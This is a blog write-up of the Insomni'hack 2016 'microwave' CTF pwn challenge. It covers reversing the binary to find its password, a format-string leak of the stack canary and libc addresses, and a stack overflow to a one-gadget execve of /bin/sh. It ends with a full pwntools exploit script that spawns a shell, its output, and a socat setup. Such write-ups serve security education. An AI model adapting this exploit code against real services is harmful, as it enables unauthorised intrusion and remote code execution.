---
layout: post
title: Insomni'hack 2016 - Microwave
date: 2016-03-21
---

This is a write-up for the <em>microwave</em> pwn of <a href="https://insomnihack.ch/">Insomni'hack</a> CTF (first published on <a href="https://deadc0de.re/articles/microwave-write-up.html">deadc0de.re</a>).

Following binaries were given:
<ul>
        <li><em>microwave_61f50dba931bb10ab3089215b2e188f4</em></li>
        <li><em>libc.so.6</em></li>
</ul>
Those are both available <a href="https://github.com/deadc0de6/ctf/tree/master/2016-insomnihack">here</a>
<h2 id="the-program">The program</h2>
The program simulates a microwave able to connect to twitter and tweets your favorite food.

There are 4 options:
<ul>
        <li>
<ol style="list-style-type:decimal;">
        <li><em>Connect to Twitter account</em>: asks for username and password to connect to twitter</li>
</ol>
</li>
        <li>
<ol style="list-style-type:decimal;" start="2">
        <li><em>Edit your tweet</em>: edit content of the tweet(s) to be sent</li>
</ol>
</li>
        <li>
<ol style="list-style-type:decimal;" start="3">
        <li><em>Grill &amp; Tweet your food</em></li>
</ol>
</li>
        <li>
<ol style="list-style-type:decimal;" start="4">
        <li><em>Exit</em></li>
</ol>
</li>
</ul>
Connect to twitter:
<pre><code>:::
 --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 1

           Log in on Twitter:
           username: test
           password: test

Checking test
Twitter account
...</code></pre>
Edit your tweet:
<pre><code>:::
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 2

           #&gt; some blabla

           Done.</code></pre>
Grill and tweet:
<pre><code>:::
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 3



  Okay! Let's do this!
...</code></pre>
Here are the protections of the binary
<pre><code>:::bash
$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
[*] '/tmp/microwave_61f50dba931bb10ab3089215b2e188f4'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled</code></pre>
<h2></h2>
<!--more-->
<h2 id="the-vulnerabilities">The vulnerabilities</h2>
<h3 id="find-the-password">Find the password</h3>
First we need a valid username/password to connect to the fake Twitter account. The username can be anything, however the function containing the <em>Checking</em> string shows where the password is checked (and what it is):
<pre><code>:::
[0x00000ac0]&gt; iz | grep Checking
[0x00000ac0]&gt; axt 0x00002ac0
data 0xf03 lea rsi, [rip + 0x1bb6] in sub.__printf_chk_f00
[0x00000ac0]&gt; pd @0xf03

... (snip) ...

      0x00000f98      488b1d713020.  mov rbx, qword [rip + 0x203071] ; [0x204010:8]=0x2b56 str.n07_7h3_fl46 ; "V
      0x00000f9f      4889df         mov rdi, rbx
      0x00000fa2      e849faffff     call sym.imp.strlen         ;[7]
      0x00000fa7      31d2           xor edx, edx
  ,=&lt; 0x00000fa9      eb13           jmp 0xfbe                   ;[9]
  |   0x00000fab      0f1f440000     nop dword [rax + rax]
  |   ; JMP XREF from 0x00000fc1 (sub.__printf_chk_f00)
 .--&gt; 0x00000fb0      0fb60c13       movzx ecx, byte [rbx + rdx]    // LOAD THE PASSWORD CHAR
 ||   0x00000fb4      384c1528       cmp byte [rbp + rdx + 0x28], cl ; [0xa:1]=0 // COMPARE PROVIDED PASSWORD CHAR
,===&lt; 0x00000fb8      752e           jne 0xfe8                   ;[?]
|||   0x00000fba      4883c201       add rdx, 1                     // NEXT CHAR
|||   ; JMP XREF from 0x00000fa9 (sub.__printf_chk_f00)
||`-&gt; 0x00000fbe      4839c2         cmp rdx, rax                   // CHECK REACH END OF STRING
|`==&lt; 0x00000fc1      75ed           jne 0xfb0                   ;[?] // GO ON
|     0x00000fc3      b801000000     mov eax, 1
|     0x00000fc8      6689453c       mov word [rbp+arg_3ch], ax  ; [0x3c:2]=27 ; '&lt;' // RETURN VALUE 1
|     ; JMP XREF from 0x00000fee (sub.__printf_chk_f00)
| .-&gt; 0x00000fcc      488b442408     mov rax, qword [rsp + 8]    ; [0x8:8]=0
| |   0x00000fd1      644833042528.  xor rax, qword fs:[0x28]
|,==&lt; 0x00000fda      7514           jne 0xff0                   ;[?]
|||   0x00000fdc      4883c410       add rsp, 0x10                                                               "

... (snip) ...

`---&gt; 0x00000fe8      31d2           xor edx, edx
 ||   0x00000fea      6689553c       mov word [rbp+arg_3ch], dx  ; [0x3c:2]=27 ; '&lt;' // RETURN VALUE 0
 |`=&lt; 0x00000fee      ebdc           jmp 0xfcc</code></pre>
The password is thus <code>n07_7h3_fl46</code>. It was however possible to "see" it using a simple <code>strings</code>.
<h3 id="vuln1-string-format">Vuln1: string format</h3>
The first vulnerability is a string format on the username when connecting to twitter:
<pre><code>:::bash
 --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 1

           Log in on Twitter:
           username: %p.%p.%p.%p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b0ce50.0x7ffff7fd8700.0x555555556ac0.(nil).0xeaa546f902a74f00.0x7ffff7dd7710.0x7ffff7dd7718
Twitter account
............</code></pre>
It is thus possible to read up the stack. The leaked values are indeed interesting and will be used later:
<ul>
        <li><em>0x7ffff7...</em> look like libc addresses</li>
        <li><em>0xeaa546f902a74f00</em> looks like the canary</li>
</ul>
<h3 id="vuln2-stack-overflow">Vuln2: stack overflow</h3>
The second vulnerability is triggered when reading the content to tweet. It reads from stdin (0) and store the result on the stack
<pre><code>:::
[0x00000ac0]&gt; iz | grep '#&gt;'
vaddr=0x00002adb paddr=0x00002adb ordinal=019 sz=16 len=15 section=.rodata type=ascii string=\n           #&gt;
[0x00000ac0]&gt; axt 0x00002adb
data 0x1007 lea rsi, [rip + 0x1acd] in sub.__printf_chk_0
[0x00000ac0]&gt; pd @0x1007
...
0x00001032      31ff           xor edi, edi // 0 == STDIN
0x00001034      4889e6         mov rsi, rsp // buffer on the stack
0x00001037      ba00080000     mov edx, section..rela.plt  ; "@? " @ 0x800
0x0000103c      31c0           xor eax, eax
0x0000103e      e8ddf9ffff     call sym.imp.read
...</code></pre>
We read up to 0x800 (2048) from stdin to the buffer (on the stack). If we consider the whole block, only 0x418 (1048) are reserved on the stack. We can thus overwrite saved RIP
<pre><code>:::
sub rsp, 0x418                  | reserve 1048
lea rsi, [rip + 0x1acd]         |
mov edi, 1                      |
mov rax, qword fs:[0x28]        | get the canary
mov qword [rsp + 0x408], rax    | store canary at 1032
xor eax, eax                    |
call sym.imp.__printf_chk ;[a]  |
xor edi, edi                    |
call sym.imp.fflush ;[b]        |
xor edi, edi                    | 0 == stdin
mov rsi, rsp                    | buffer on the stack
mov edx, section..rela.plt      | 0x800
xor eax, eax                    |
call sym.imp.read ;[c]          |
lea rdi, [rip + 0x1aa1]         |
call sym.imp.puts ;[d]          |
mov rax, qword [rsp + 0x408]    |
xor rax, qword fs:[0x28]        |
jne 0x106a ;[e]</code></pre>
So to overflow the saved RIP, the payload should look like this:
<ul>
        <li>1032 bytes of junk</li>
        <li>8 bytes to replace the canary</li>
        <li><code>1048-1032-8 = 8</code> bytes</li>
        <li>saved RIP</li>
</ul>
<h2 id="the-exploit">The exploit</h2>
Due to the protections, one needs to exploit the binary using ROP. However looking into the provided libc shows that the <em>magic</em> ROP chain is present.
<pre><code>:::
.text:000000000004652C mov     rax, cs:environ_ptr_0
.text:0000000000046533 lea     rdi, aBinSh     ; "/bin/sh"
.text:000000000004653A lea     rsi, [rsp+180h+var_150]
.text:000000000004653F mov     cs:dword_3C06C0, 0
.text:0000000000046549 mov     cs:dword_3C06D0, 0
.text:0000000000046553 mov     rdx, [rax]
.text:0000000000046556 call    execve</code></pre>
So by overwriting the saved-RIP with that address (libc base address + 0x4652C) we get RCE (execve of "/bin/sh").

One needs to leak two elements to be able to exploit:
<ul>
        <li>the canary (to bypass canary protection)</li>
        <li>one address of the libc to retrieve the offset to the magic gadget above</li>
</ul>
These are retrieved using the first vulnerability (string format). Then the second vulnerability (buffer overflow) is used to overflow the stack and overwrite the return address.

The addresses leaked from the string format shows some of them are in the libc (starting with 0x7fff...). We need to know how far from the base address these are in order to retrieve the base address. This base address is then used to refer to the magic gadget.

This is easily done with gdb:
<pre><code>:::bash
$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
gdb-peda$ set environment LD_PRELOAD=./libc.so.6
gdb-peda$ r
Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4

 --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 1

           Log in on Twitter:
           username: %p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b02870.0x7ffff7ff3740.0x555555556ac0.(nil)
Twitter account
............
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: ^C
Program received signal SIGINT, Interrupt.
Stopped reason: SIGINT
0x00007ffff7b02810 in read () from ./libc.so.6
gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555557000 r-xp  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555757000 0x0000555555758000 r--p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555758000 0x0000555555759000 rw-p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555759000 0x000055555577a000 rw-p  [heap]
0x00007ffff7a17000 0x00007ffff7bd2000 r-xp  /tmp/libc.so.6
0x00007ffff7bd2000 0x00007ffff7dd1000 ---p  /tmp/libc.so.6
0x00007ffff7dd1000 0x00007ffff7dd5000 r--p  /tmp/libc.so.6
0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p  /tmp/libc.so.6
0x00007ffff7dd7000 0x00007ffff7ddc000 rw-p  mapped
0x00007ffff7ddc000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ff2000 0x00007ffff7ff8000 rw-p  mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r-xp  [vdso]
0x00007ffff7ffa000 0x00007ffff7ffc000 r--p  [vvar]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]</code></pre>
The offset is thus <code>hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870</code>

Now you can construct the exploit using <a href="https://github.com/Gallopsled/pwntools">pwntools</a>:

Exploit:
<pre><code>:::Python
#!/usr/bin/env python2
# author: deadc0de6

from pwn import *
context.arch='amd64'

PASSWORD = "n07_7h3_fl46"
magic_addr = 0x4652c
base_offset = 0xeb870

#p = remote('microwave.insomni.hack', 1337)
p = remote('127.0.0.1', 1337)

print p.recvuntil('[MicroWave]: ')

# select (1) connect
p.sendline("1")
p.recvuntil("username: ")

# send username
p.sendline("%p."*8)
p.recvuntil("password: ")
# send password
p.sendline(PASSWORD)

# read leaked addresses
ret = p.recvuntil('[MicroWave]: ')
addrs = ret.split()[1].split('.')
print addrs

# canary is the sixth element
canary = int(addrs[5], 16)

# libc address is the second element
libcaddr = int(addrs[1], 16)
libc_base = libcaddr - base_offset

# print some information
print 'canary is %s' % (hex(canary))
print "libc base: %s" % (hex(libc_base))
print "magic addr: %s" % (hex(libc_base + magic_addr))

# select (2) send tweet
p.sendline("2")
print p.recvuntil("#&gt; ")

# construct the exploit
buf = "A"*1032
buf += pack(canary)
buf += "B"*8
buf += pack(libc_base + magic_addr)

# exploit
p.sendline(buf)
p.clean()

# interact with it
p.interactive()</code></pre>
It is then possible to <code>cat</code> the flag.
<pre><code>:::bash
$ ./microwave-pwn.py
[+] Opening connection to 127.0.0.1 on port 1337: Done

 --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]:
['0xa', '0x7f192241b870', '0x7f1922b16740', '0x7f192291aac0', '(nil)', '0x4cacfb0061420700', '0x7f19226ef870', '0x7f19226ef878', '']
canary is 0x4cacfb0061420700
libc base: 0x7f1922330000
magic addr: 0x7f192237652c

           #&gt;
[*] Switching to interactive mode
$ ls
...</code></pre>
To reproduce the execution locally, I used socat with the following tweak:
<pre><code>:::bash
$ cat doit.sh
#!/bin/bash
LD_PRELOAD=./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
$ socat tcp-l:1337,reuseaddr,fork exec:./doit.sh</code></pre>
<h3 id="note">Note</h3>
On some systems, using <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">LD_PRELOAD</a> won't work and thus <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">LD_LIBRARY_PATH</a> with the full path to the folder containing the provided libc (<em>libc.so.6</em>) should be provided.

It is indeed a better way of doing it since <em>LD_PRELOAD</em> should be used when replacing only some specific functions of a library and not a full library (in which case <em>LD_LIBRARY_PATH</em> is to be used).

Thanks to <a href="https://twitter.com/dummys1337">Dummys1337</a> for pointing that out !!

<hr />
